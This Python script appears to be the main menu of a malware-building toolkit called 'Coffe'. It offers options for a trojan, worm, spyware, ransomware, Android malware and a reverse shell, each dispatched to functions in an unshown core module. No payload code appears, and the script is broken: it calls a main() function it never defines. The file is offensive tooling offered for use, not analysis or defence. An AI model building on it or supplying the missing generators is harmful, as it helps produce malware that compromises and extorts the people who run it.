import os, sys, time
from time import sleep as timeout
from core.cfcore import *

#Main
check_user()
print("Message from null/: type install for easy to use <3")
print()
print("[A] RiPz")
print("[S] https://github.com/Plague1234")
print("[V] 0.0.1")
print("[D] " + now)
check_menu()
print("\nWhat's Coffe do you want neo? \n")
coffe_order = input("[$root ~/coffe ]# ")

if coffe_order == "trojan":
  closed()
  trojan()

elif coffe_order == "worm":
  closed()
  worm()

elif coffe_order == "spy":
  closed()
  spy()

elif coffe_order == "ransomware":
  closed()
  ransomware()

elif coffe_order == "android-malware":
  closed()
  admalware()

elif coffe_order == "reverseshell":
  closed()
  rvshell()

elif coffe_order == "install" or coffe_order == "INSTALL":
  install()

elif coffe_order == "update":
  update()

elif coffe_order == "Kidz" or coffe_order == "RiPz":
  addon()

else:
  print("ERROR : WRONG INPUT\n")
  timeout(2)
  backtomenu_option()

if __name__ == "__main__":
  os.system('clear')
  main()
